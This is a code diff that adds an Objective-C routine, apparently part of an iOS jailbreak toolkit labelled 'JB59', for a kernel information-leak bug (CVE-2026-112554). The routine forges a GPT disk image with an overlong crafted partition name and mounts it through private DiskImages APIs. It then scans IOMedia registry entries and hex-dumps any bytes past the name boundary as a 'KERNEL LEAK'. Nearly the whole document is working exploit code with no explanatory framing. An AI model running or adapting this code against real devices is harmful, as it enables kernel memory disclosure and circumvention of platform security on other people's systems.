@@ -43235,3 +43235,399 @@ void iosurface_aggressive_exploit(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+#pragma mark - JB59: CVE-2026-112554 GPT Mount via DIAttachParams
+
+void iosurface_gpt_mount(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        log(@"JB59: === CVE-2026-112554 — GPT Mount via DIAttachParams ===");
+
+        void *hDI = dlopen("/System/Library/PrivateFrameworks/DiskImages.framework/DiskImages", RTLD_NOW);
+        void *hDI2 = dlopen("/System/Library/PrivateFrameworks/DiskImages2.framework/DiskImages2", RTLD_NOW);
+        log([NSString stringWithFormat:@"JB59: DiskImages=%p DiskImages2=%p", hDI, hDI2]);
+
+        typedef id(*msgsend_fn)(id, SEL, ...);
+        msgsend_fn msg = (msgsend_fn)dlsym(RTLD_DEFAULT, "objc_msgSend");
+
+        typedef void*(*matching_fn)(const char*);
+        typedef int(*getsvcs_fn)(unsigned int, void*, unsigned int*);
+        typedef unsigned int(*iternext_fn)(unsigned int);
+        typedef int(*regname_fn)(unsigned int, char*);
+        typedef void(*objrelease_fn)(unsigned int);
+        typedef int(*regentry_prop_fn)(unsigned int, const char*, void*, uint32_t*);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getsvcs_fn sym_getsvcs = (getsvcs_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingServices");
+        iternext_fn sym_next = (iternext_fn)dlsym(RTLD_DEFAULT, "IOIteratorNext");
+        regname_fn sym_regname = (regname_fn)dlsym(RTLD_DEFAULT, "IORegistryEntryGetName");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        regentry_prop_fn sym_getprop = (regentry_prop_fn)dlsym(RTLD_DEFAULT, "IORegistryEntryGetProperty");
+        typedef unsigned long(*crc32_fn)(unsigned long, const unsigned char*, unsigned int);
+        crc32_fn zcrc32 = (crc32_fn)dlsym(RTLD_DEFAULT, "crc32");
+
+        if (!msg || !sym_matching || !sym_getsvcs || !sym_next || !sym_regname || !sym_release || !zcrc32) {
+            log(@"JB59: missing symbols");
+            results[@"verdict"] = @"NO_SYMBOLS";
+            done(results);
+            return;
+        }
+
+        // W1: Snapshot existing IOMedia before mount
+        log(@"JB59: --- W1: Pre-mount IOMedia snapshot ---");
+        NSMutableSet *preMedia = [NSMutableSet set];
+        {
+            unsigned int iter = 0;
+            int kr = sym_getsvcs(0, sym_matching("IOMedia"), &iter);
+            if (kr == 0 && iter) {
+                unsigned int svc;
+                while ((svc = sym_next(iter)) != 0) {
+                    char nm[256] = {0};
+                    sym_regname(svc, nm);
+                    [preMedia addObject:[NSString stringWithUTF8String:nm]];
+                    sym_release(svc);
+                }
+                sym_release(iter);
+            }
+        }
+        log([NSString stringWithFormat:@"JB59: W1 pre-mount media count=%lu", (unsigned long)preMedia.count]);
+        results[@"w1_pre_count"] = @(preMedia.count);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // W2: Create GPT image with crafted partition name (36 non-NUL UTF-16LE chars)
+        log(@"JB59: --- W2: GPT image creation ---");
+        uint32_t sec_sz = 512;
+        uint32_t total_sec = 8192;
+        uint32_t img_sz = sec_sz * total_sec;
+        uint32_t nent = 8;
+        uint32_t entsz = 128;
+        uint32_t ent_sectors = (nent * entsz + sec_sz - 1) / sec_sz;
+        uint64_t first_usable = 2 + ent_sectors;
+        uint64_t last_usable = total_sec - 2 - ent_sectors;
+
+        uint8_t *imgbuf = (uint8_t *)calloc(1, img_sz);
+        NSString *imgPath = nil;
+
+        if (imgbuf) {
+            imgbuf[446 + 4] = 0xEE;
+            imgbuf[446 + 8] = 1;
+            uint32_t mbrsz = total_sec - 1;
+            memcpy(imgbuf + 446 + 12, &mbrsz, 4);
+            imgbuf[510] = 0x55; imgbuf[511] = 0xAA;
+
+            uint8_t *h = imgbuf + sec_sz;
+            memcpy(h, "EFI PART", 8);
+            uint32_t tmp32; uint64_t tmp64;
+            tmp32 = 0x00010000; memcpy(h + 8, &tmp32, 4);
+            tmp32 = 92; memcpy(h + 12, &tmp32, 4);
+            tmp64 = 1; memcpy(h + 24, &tmp64, 8);
+            tmp64 = total_sec - 1; memcpy(h + 32, &tmp64, 8);
+            tmp64 = first_usable; memcpy(h + 40, &tmp64, 8);
+            tmp64 = last_usable; memcpy(h + 48, &tmp64, 8);
+            arc4random_buf(h + 56, 16);
+            tmp64 = 2; memcpy(h + 72, &tmp64, 8);
+            tmp32 = nent; memcpy(h + 80, &tmp32, 4);
+            tmp32 = entsz; memcpy(h + 84, &tmp32, 4);
+
+            uint8_t *entries = imgbuf + 2 * sec_sz;
+            uint8_t type_guid[16] = {0xA2,0xA0,0xD0,0xEB,0xE5,0xB9,0x33,0x44,
+                                     0x87,0xC0,0x68,0xB6,0xB7,0x26,0x99,0xC7};
+            for (int p = 0; p < (int)nent; p++) {
+                uint8_t *e = entries + p * entsz;
+                memcpy(e, type_guid, 16);
+                arc4random_buf(e + 16, 16);
+                uint64_t pstart = first_usable + (uint64_t)p;
+                uint64_t pend = pstart;
+                memcpy(e + 32, &pstart, 8);
+                memcpy(e + 40, &pend, 8);
+                if (p < 7) {
+                    for (int i = 0; i < 8; i++) {
+                        e[56 + i * 2] = 'P';
+                        e[56 + i * 2 + 1] = 0;
+                    }
+                } else {
+                    for (int i = 0; i < 36; i++) {
+                        e[56 + i * 2] = (uint8_t)('A' + (i % 26));
+                        e[56 + i * 2 + 1] = 0;
+                    }
+                }
+            }
+
+            uint32_t ecrc = (uint32_t)zcrc32(0, entries, nent * entsz);
+            memcpy(h + 88, &ecrc, 4);
+            memset(h + 16, 0, 4);
+            uint32_t hcrc = (uint32_t)zcrc32(0, h, 92);
+            memcpy(h + 16, &hcrc, 4);
+
+            uint64_t bk_ent_start = total_sec - 1 - ent_sectors;
+            memcpy(imgbuf + bk_ent_start * sec_sz, entries, nent * entsz);
+            uint8_t *bh = imgbuf + (total_sec - 1) * sec_sz;
+            memcpy(bh, h, 92);
+            tmp64 = total_sec - 1; memcpy(bh + 24, &tmp64, 8);
+            tmp64 = 1; memcpy(bh + 32, &tmp64, 8);
+            memcpy(bh + 72, &bk_ent_start, 8);
+            memset(bh + 16, 0, 4);
+            uint32_t bhcrc = (uint32_t)zcrc32(0, bh, 92);
+            memcpy(bh + 16, &bhcrc, 4);
+
+            imgPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"jb59_gpt.img"];
+            NSData *imgData = [NSData dataWithBytesNoCopy:imgbuf length:img_sz freeWhenDone:NO];
+            BOOL wrote = [imgData writeToFile:imgPath atomically:YES];
+            log([NSString stringWithFormat:@"JB59: W2 image=%d size=%u path=%@", wrote, img_sz, imgPath]);
+            free(imgbuf);
+        }
+
+        if (!imgPath) {
+            results[@"verdict"] = @"NO_IMAGE";
+            done(results);
+            return;
+        }
+        results[@"w2_image"] = @(1);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // W3: DIAttachParams — create params and attempt mount
+        log(@"JB59: --- W3: DIAttachParams mount attempt ---");
+        int w3_attached = 0;
+        int w3_init_ok = 0;
+        NSString *w3_error = nil;
+
+        Class diClass = NSClassFromString(@"DIAttachParams");
+        if (diClass) {
+            NSURL *imgURL = [NSURL fileURLWithPath:imgPath];
+            NSError *err = nil;
+
+            typedef id(*initURL_fn)(id, SEL, id, NSError**);
+            initURL_fn initFn = (initURL_fn)msg;
+
+            @try {
+                id allocd = [diClass alloc];
+                id params = initFn(allocd, @selector(initWithURL:error:), imgURL, &err);
+                if (params) {
+                    w3_init_ok = 1;
+                    log(@"JB59: W3 DIAttachParams init OK");
+
+                    @try {
+                        typedef BOOL(*boolget_fn)(id, SEL);
+                        boolget_fn boolFn = (boolget_fn)msg;
+                        BOOL autoM = boolFn(params, @selector(autoMount));
+                        BOOL persist = boolFn(params, @selector(persistentAttach));
+                        BOOL emuExt = boolFn(params, @selector(emulateExternalDisk));
+                        log([NSString stringWithFormat:@"JB59: W3 autoMount=%d persist=%d emuExt=%d", autoM, persist, emuExt]);
+                    } @catch (NSException *ex) {
+                        log([NSString stringWithFormat:@"JB59: W3 prop read err: %@", ex.reason]);
+                    }
+
+                    typedef id(*attachErr_fn)(id, SEL, NSError**);
+                    attachErr_fn attachFn = (attachErr_fn)msg;
+                    err = nil;
+
+                    @try {
+                        id handle = attachFn(params, @selector(newAttachWithError:), &err);
+                        if (handle) {
+                            w3_attached = 1;
+                            log([NSString stringWithFormat:@"JB59: W3 ATTACH SUCCESS! handle=%p", handle]);
+                        } else {
+                            w3_error = [NSString stringWithFormat:@"%@", err];
+                            log([NSString stringWithFormat:@"JB59: W3 attach failed: %@", err]);
+                        }
+                    } @catch (NSException *ex) {
+                        w3_error = ex.reason;
+                        log([NSString stringWithFormat:@"JB59: W3 attach exception: %@", ex.reason]);
+                    }
+                } else {
+                    w3_error = [NSString stringWithFormat:@"%@", err];
+                    log([NSString stringWithFormat:@"JB59: W3 init failed: %@", err]);
+                }
+            } @catch (NSException *ex) {
+                w3_error = ex.reason;
+                log([NSString stringWithFormat:@"JB59: W3 exception: %@", ex.reason]);
+            }
+        } else {
+            w3_error = @"class_not_found";
+            log(@"JB59: W3 DIAttachParams not found");
+        }
+        results[@"w3_init_ok"] = @(w3_init_ok);
+        results[@"w3_attached"] = @(w3_attached);
+        if (w3_error) results[@"w3_error"] = w3_error;
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // W4: Alternative — try initWithURL:shadowURLs:error: (shadow mount)
+        if (!w3_attached && diClass) {
+            log(@"JB59: --- W4: Shadow URL mount attempt ---");
+            @try {
+                NSURL *imgURL = [NSURL fileURLWithPath:imgPath];
+                NSError *err = nil;
+                typedef id(*initShadow_fn)(id, SEL, id, id, NSError**);
+                initShadow_fn shadowFn = (initShadow_fn)msg;
+                NSString *shadowPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"jb59_shadow.img"];
+                [[NSData data] writeToFile:shadowPath atomically:YES];
+                NSURL *shadowURL = [NSURL fileURLWithPath:shadowPath];
+                NSArray *shadows = @[shadowURL];
+                id params2 = shadowFn([diClass alloc], @selector(initWithURL:shadowURLs:error:), imgURL, shadows, &err);
+                if (params2) {
+                    log(@"JB59: W4 shadow init OK");
+                    typedef id(*attachErr_fn)(id, SEL, NSError**);
+                    attachErr_fn attachFn = (attachErr_fn)msg;
+                    err = nil;
+                    @try {
+                        id handle2 = attachFn(params2, @selector(newAttachWithError:), &err);
+                        if (handle2) {
+                            w3_attached = 1;
+                            log([NSString stringWithFormat:@"JB59: W4 SHADOW ATTACH SUCCESS! handle=%p", handle2]);
+                        } else {
+                            log([NSString stringWithFormat:@"JB59: W4 shadow attach failed: %@", err]);
+                        }
+                    } @catch (NSException *ex) {
+                        log([NSString stringWithFormat:@"JB59: W4 shadow attach exception: %@", ex.reason]);
+                    }
+                } else {
+                    log([NSString stringWithFormat:@"JB59: W4 shadow init failed: %@", err]);
+                }
+                [[NSFileManager defaultManager] removeItemAtPath:shadowPath error:nil];
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB59: W4 exception: %@", ex.reason]);
+            }
+        }
+        results[@"w4_tried"] = @(!w3_attached ? 1 : 0);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // W5: Enumerate all DIAttachParams methods (full 45) for analysis
+        log(@"JB59: --- W5: Full method enumeration ---");
+        if (diClass) {
+            unsigned int mcount = 0;
+            Method *methods = class_copyMethodList(diClass, &mcount);
+            if (methods) {
+                for (unsigned int i = 0; i < mcount; i++) {
+                    SEL sel = method_getName(methods[i]);
+                    const char *enc = method_getTypeEncoding(methods[i]);
+                    log([NSString stringWithFormat:@"JB59: W5 [%u] %s enc=%s", i, sel_getName(sel), enc ? enc : "nil"]);
+                }
+                free(methods);
+            }
+            log([NSString stringWithFormat:@"JB59: W5 total=%u", mcount]);
+            results[@"w5_methods"] = @(mcount);
+        }
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // W6: Try hdiutil-style attach via copyWithURL class method
+        log(@"JB59: --- W6: copyWithURL class method ---");
+        if (diClass) {
+            @try {
+                typedef BOOL(*copyURL_fn)(id, SEL, id, char*, size_t, NSError**);
+                copyURL_fn copyFn = (copyURL_fn)msg;
+                NSURL *imgURL = [NSURL fileURLWithPath:imgPath];
+                char outStr[512] = {0};
+                NSError *err = nil;
+                BOOL ok = copyFn(diClass, @selector(copyWithURL:outURLStr:maxLen:error:), imgURL, outStr, 512, &err);
+                log([NSString stringWithFormat:@"JB59: W6 copyWithURL ok=%d out='%s' err=%@", ok, outStr, err]);
+                results[@"w6_copy"] = @(ok);
+            } @catch (NSException *ex) {
+                log([NSString stringWithFormat:@"JB59: W6 exception: %@", ex.reason]);
+            }
+        }
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // W7: Post-mount IOMedia scan for new entries (leaked data)
+        log(@"JB59: --- W7: Post-mount IOMedia scan ---");
+        int w7_new = 0;
+        int w7_leaked = 0;
+        {
+            unsigned int iter = 0;
+            int kr = sym_getsvcs(0, sym_matching("IOMedia"), &iter);
+            if (kr == 0 && iter) {
+                unsigned int svc;
+                while ((svc = sym_next(iter)) != 0 && !isr_stopped()) {
+                    char nm[512] = {0};
+                    sym_regname(svc, nm);
+                    NSString *name = [NSString stringWithUTF8String:nm];
+                    size_t len = strlen(nm);
+
+                    if (![preMedia containsObject:name]) {
+                        w7_new++;
+                        log([NSString stringWithFormat:@"JB59: W7 NEW media: '%@' len=%zu", name, len]);
+                    }
+
+                    if (len > 36) {
+                        w7_leaked++;
+                        NSMutableString *hex = [NSMutableString string];
+                        for (size_t i = 36; i < len && i < 256; i++) {
+                            [hex appendFormat:@"%02x", (uint8_t)nm[i]];
+                        }
+                        log([NSString stringWithFormat:@"JB59: W7 KERNEL LEAK! len=%zu leaked_hex=%@", len, hex]);
+                        results[@"w7_leaked_hex"] = hex;
+                    }
+
+                    if (sym_getprop) {
+                        char content[1024] = {0};
+                        uint32_t csz = 1024;
+                        int pr = sym_getprop(svc, "Content", content, &csz);
+                        if (pr == 0 && csz > 0) {
+                            NSString *cstr = [[NSString alloc] initWithBytes:content length:csz encoding:NSUTF8StringEncoding];
+                            if (cstr && cstr.length > 36) {
+                                log([NSString stringWithFormat:@"JB59: W7 Content prop len=%lu: %@", (unsigned long)cstr.length, cstr]);
+                            }
+                        }
+                    }
+
+                    sym_release(svc);
+                }
+                sym_release(iter);
+            }
+        }
+        results[@"w7_new"] = @(w7_new);
+        results[@"w7_leaked"] = @(w7_leaked);
+        log([NSString stringWithFormat:@"JB59: W7 new=%d leaked=%d", w7_new, w7_leaked]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // W8: Scan IOGPTPartitionScheme / IOFDiskPartitionScheme for GPT evidence
+        log(@"JB59: --- W8: Partition scheme scan ---");
+        int w8_found = 0;
+        {
+            const char *schemes[] = {"IOGPTPartitionScheme", "IOFDiskPartitionScheme",
+                                     "IOApplePartitionScheme", "IOPartitionScheme"};
+            for (int s = 0; s < 4; s++) {
+                unsigned int iter = 0;
+                int kr = sym_getsvcs(0, sym_matching(schemes[s]), &iter);
+                if (kr == 0 && iter) {
+                    unsigned int svc;
+                    while ((svc = sym_next(iter)) != 0) {
+                        w8_found++;
+                        char nm[256] = {0};
+                        sym_regname(svc, nm);
+                        log([NSString stringWithFormat:@"JB59: W8 %s: '%s'", schemes[s], nm]);
+                        sym_release(svc);
+                    }
+                    sym_release(iter);
+                }
+            }
+        }
+        results[@"w8_schemes"] = @(w8_found);
+        log([NSString stringWithFormat:@"JB59: W8 partition schemes found=%d", w8_found]);
+
+        // Cleanup
+        [[NSFileManager defaultManager] removeItemAtPath:imgPath error:nil];
+
+        // Verdict
+        NSString *verdict = @"NO_MOUNT";
+        if (w7_leaked > 0) {
+            verdict = @"KERNEL_HEAP_LEAK";
+        } else if (w3_attached) {
+            verdict = w7_new > 0 ? @"MOUNTED_NEW_MEDIA" : @"MOUNTED_NO_LEAK";
+        } else if (w3_init_ok) {
+            verdict = @"INIT_OK_NO_ATTACH";
+        } else if (diClass) {
+            verdict = @"CLASS_FOUND";
+        }
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB59: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB59-gpt-mount-checkpoint.json", results);
+        done(results);
+    });
+}
